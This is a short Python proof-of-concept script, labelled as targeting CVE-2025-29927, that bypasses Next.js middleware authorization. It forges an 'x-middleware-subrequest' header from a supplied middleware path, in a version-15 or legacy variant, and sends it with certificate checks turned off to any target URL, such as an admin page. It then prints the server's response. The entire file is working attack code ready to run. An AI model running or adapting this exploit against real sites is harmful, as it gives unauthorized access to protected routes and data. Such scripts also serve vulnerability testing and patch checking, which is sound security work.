import argparse
import requests

def generate_bypass_header(middleware_path, version):
    if version == "15":
        header_value = ':'.join([middleware_path] * 5)
    else:
        header_value = middleware_path
    return {
        "x-middleware-subrequest": header_value,
        "User-Agent": "Mozilla/5.0"
    }

def exploit(url, middleware_path, version):
    headers = generate_bypass_header(middleware_path, version)

    print(f"[+] Target URL: {url}")
    print(f"[+] Middleware Path: {middleware_path}")
    print(f"[+] Next.js Version Family: {version}")
    print(f"[+] Sending request with x-middleware-subrequest: {headers['x-middleware-subrequest']}")

    try:
        response = requests.get(url, headers=headers, verify=False)
        print(f"\n[+] Status Code: {response.status_code}")
        print(f"[+] Response Headers:\n{response.headers}")
        print("\n[+] Response Body:\n")
        print(response.text)
    except requests.RequestException as e:
        print(f"[-] Request failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PoC for CVE-2025-29927 - Next.js Middleware Bypass")
    parser.add_argument("--url", required=True, help="Target URL (e.g., https://target.com/admin)")
    parser.add_argument("--middleware", required=True, help="Middleware path (e.g., middleware, src/middleware, pages/_middleware)")
    parser.add_argument("--version", choices=["15", "legacy"], default="15", help="Version mode: 15 (depth-based) or legacy (direct match)")
    args = parser.parse_args()

    exploit(args.url, args.middleware, args.version)
